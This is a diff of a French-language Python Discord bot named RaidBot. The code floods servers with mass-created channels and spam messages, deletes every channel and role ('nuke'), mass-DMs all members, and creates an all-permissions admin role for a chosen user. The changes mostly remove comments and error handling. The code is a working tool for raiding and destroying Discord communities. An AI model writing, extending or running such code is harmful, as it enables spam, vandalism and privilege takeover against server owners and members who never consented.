@@ -5,10 +5,11 @@ intents = discord.Intents.default()
 intents.members = True
 
 client = discord.Client(intents=intents)
-rate_limit_count = 0  # Compteur de rate limiting
+
+rate_limit_count = 0
 
 async def spam_channels(guild, channel_name, message, num_channels, repeat_count):
-    global rate_limit_count  # Utilisation de la variable globale
+    global rate_limit_count
 
     print(f"Création de {num_channels} salons '{channel_name}' dans le serveur {guild.name}")
 
@@ -19,7 +20,7 @@ async def spam_channels(guild, channel_name, message, num_channels, repeat_count
     try:
         await asyncio.gather(*tasks)
         print(f"{num_channels} salons créés avec succès dans le serveur {guild.name}")
-        rate_limit_count = 0  # Réinitialiser le compteur en cas de succès
+        rate_limit_count = 0
     except discord.HTTPException as e:
         if e.status == 429:
             rate_limit_count += 1
@@ -27,49 +28,35 @@ async def spam_channels(guild, channel_name, message, num_channels, repeat_count
             if rate_limit_count >= 3:
                 print("Vous êtes rate limited par Discord 3 fois consécutives, le raid s'arrête et retourne au menu principal.")
                 rate_limit_count = 0
-                return False  # Indiquer l'échec du raid
+                return False
             else:
-                await asyncio.sleep(2)  # Attendre un peu avant de réessayer
-                return await spam_channels(guild, channel_name, message, num_channels, repeat_count)  # Réessayer le raid
-    return True  # Indiquer le succès du raid
+                await asyncio.sleep(2)
+                return await spam_channels(guild, channel_name, message, num_channels, repeat_count)
+    return True
 
 async def create_and_send_message(guild, channel_name, message, index, repeat_count):
-    try:
-        channel = await guild.create_text_channel(f"{channel_name}-{index}")
-        print(f"Salon '{channel.name}' créé dans le serveur {guild.name}")
+    channel = await guild.create_text_channel(f"{channel_name}-{index}")
+    print(f"Salon '{channel.name}' créé dans le serveur {guild.name}")
 
-        if message.strip():
-            for _ in range(repeat_count):
-                await channel.send(message)
-                await asyncio.sleep(0.5)
-        else:
-            print(f"Message vide pour le salon '{channel.name}', aucun message envoyé.")
-    except discord.Forbidden:
-        print(f"Le bot n'a pas les permissions nécessaires pour créer un salon ou envoyer des messages dans {guild.name}.")
-    except discord.HTTPException as e:
-        if e.status == 429:
-            raise e  # Propager l'exception pour arrêter le raid
+    if message.strip():
+        for _ in range(repeat_count):
+            await channel.send(message)
+            await asyncio.sleep(0.5)
+    else:
+        print(f"Message vide pour le salon '{channel.name}', aucun message envoyé.")
 
 async def list_servers():
     print("Affichage des serveurs et invitations :")
     for guild in client.guilds:
-        try:
-            if guild.text_channels:
-                invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1)
-                print(f"Nom du serveur : {guild.name}")
-                print(f"ID du serveur : {guild.id}")
-                print(f"Invitation : {invite.url}")
-                print("--------------------------")
-            else:
-                print(f"Le serveur '{guild.name}' n'a pas de salons textuels.")
-                print("--------------------------")
-        except discord.Forbidden:
-            print(f"Le bot n'a pas les permissions nécessaires pour créer une invitation dans {guild.name}.")
-        except discord.HTTPException as e:
-            if e.status == 429:
-                print("Vous êtes rate limited par Discord, veuillez attendre un peu avant de réessayer.")
-            else:
-                print(f"Une erreur HTTP s'est produite : {e}")
+        if guild.text_channels:
+            invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1)
+            print(f"Nom du serveur : {guild.name}")
+            print(f"ID du serveur : {guild.id}")
+            print(f"Invitation : {invite.url}")
+            print("--------------------------")
+        else:
+            print(f"Le serveur '{guild.name}' n'a pas de salons textuels.")
+            print("--------------------------")
 
 async def nuke_server(guild):
     print(f"En train de nettoyer le serveur {guild.name} ...")
@@ -79,11 +66,8 @@ async def nuke_server(guild):
             await channel.delete()
         except discord.Forbidden:
             print(f"Impossible de supprimer le salon {channel.name} car le bot n'a pas les permissions nécessaires.")
-        except discord.HTTPException as e:
-            if e.status == 429:
-                print("Vous êtes rate limited par Discord, veuillez attendre un peu avant de réessayer.")
-            else:
-                print(f"Une erreur s'est produite lors de la suppression du salon {channel.name} : {e}")
+        except Exception as e:
+            print(f"Une erreur s'est produite lors de la suppression du salon {channel.name} : {e}")
 
     for role in guild.roles:
         try:
@@ -91,10 +75,7 @@ async def nuke_server(guild):
         except discord.Forbidden:
             print(f"Impossible de supprimer le rôle {role.name} car le bot n'a pas les permissions nécessaires.")
         except discord.HTTPException as e:
-            if e.status == 429:
-                print("Vous êtes rate limited par Discord, veuillez attendre un peu avant de réessayer.")
-            else:
-                print(f"Une erreur s'est produite lors de la suppression du rôle {role.name} : {e}")
+            print(f"Une erreur s'est produite lors de la suppression du rôle {role.name} : {e}")
 
     print(f"Nettoyage terminé pour le serveur {guild.name}.")
 
@@ -108,11 +89,8 @@ async def dm_all_members(guild, message):
             print(f"Message envoyé à {member.name}")
         except discord.Forbidden:
             print(f"Impossible d'envoyer un message à {member.name}, permission refusée.")
-        except discord.HTTPException as e:
-            if e.status == 429:
-                print("Vous êtes rate limited par Discord, veuillez attendre un peu avant de réessayer.")
-            else:
-                print(f"Une erreur s'est produite lors de l'envoi d'un message à {member.name} : {e}")
+        except Exception as e:
+            print(f"Une erreur s'est produite lors de l'envoi d'un message à {member.name} : {e}")
 
 async def give_admin_role(guild, member_id):
     member = guild.get_member(member_id)
@@ -127,19 +105,12 @@ async def give_admin_role(guild, member_id):
 
     highest_bot_role = max(bot_roles, key=lambda r: r.position)
     
-    try:
-        admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions.all(), reason="Admin role created by bot")
-        # Move the admin role to the position just below the highest bot role
-        await admin_role.edit(position=highest_bot_role.position - 1)
-        await member.add_roles(admin_role)
-        print(f"Rôle administrateur donné à {member.name} dans le serveur {guild.name}")
-    except discord.Forbidden:
-        print(f"Le bot n'a pas les permissions nécessaires pour créer ou attribuer un rôle dans {guild.name}.")
-    except discord.HTTPException as e:
-        if e.status == 429:
-            print("Vous êtes rate limited par Discord, veuillez attendre un peu avant de réessayer.")
-        else:
-            print(f"Une erreur HTTP s'est produite : {e}")
+    admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions.all(), reason="Admin role created by bot")
+    
+    await admin_role.edit(position=highest_bot_role.position - 1)
+    
+    await member.add_roles(admin_role)
+    print(f"Rôle administrateur donné à {member.name} dans le serveur {guild.name}")
 
 async def main_menu():
     global rate_limit_count
@@ -236,18 +207,29 @@ async def main_menu():
 
 @client.event
 async def on_ready():
-    print(f"Bot connecté en tant que {client.user}")
-    await client.change_presence(activity=discord.Game(name="github.com/kzoxmazpx/RaidBot"))
+    print(f'Bot connecté en tant que {client.user}')
     await main_menu()
 
 if __name__ == "__main__":
     token = input("Entrez le token du bot : ")
     try:
         client.run(token)
-    except discord.errors.PrivilegedIntentsRequired:
-        print("Erreur : Le bot requiert des intents privilégiés qui n'ont pas été activés. Veuillez les activer dans le portail développeur Discord.")
+    except discord.PrivilegedIntentsRequired:
+        print("Erreur: Privileged intents required. Veuillez activer les intents dans le portail développeur.")
+    except discord.LoginFailure:
+        print("Erreur: Échec de la connexion, token invalide.")
     except discord.HTTPException as e:
         if e.status == 429:
-            print("Vous êtes rate limited par Discord, veuillez attendre un peu avant de réessayer.")
+            print("Erreur: Vous êtes rate limited par Discord, veuillez attendre un peu avant de réessayer.")
         else:
-            print(f"Une erreur HTTP s'est produite : {e}")
+            print(f"Erreur HTTP inattendue: {e}")
+    except Exception as e:
+        print(f"Erreur inattendue: {e}")
+    finally:
+        print("Pour quitter, faites CTRL + C.")
+        while True:
+            try:
+                pass  # Maintenir le script en cours d'exécution
+            except KeyboardInterrupt:
+                print("Arrêt du script.")
+                break
